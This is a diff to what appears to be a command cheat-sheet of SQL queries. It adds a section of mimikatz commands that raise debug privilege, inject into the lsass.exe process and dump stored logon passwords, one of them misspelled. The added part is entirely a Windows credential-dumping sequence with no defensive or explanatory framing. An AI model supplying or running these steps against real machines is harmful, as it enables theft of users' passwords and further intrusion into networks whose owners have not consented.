@@ -116,4 +116,12 @@ query SELECT * FROM contacts ORDER BY fname
 query SELECT fname, lname FROM contacts ORDER BY fname
 query SELECT lname, fname FROM contacts ORDER BY lname
 query DELETE FROM hosts WHERE ip_address='192.168.2.12'
+------------------------------------------------------------------------------------------------------
+
+# mimikatz
+
+mimikatz
+priviledge::debug
+inject::process lsass.exe sekurlsa.dll
+@getLogonPasswords
 
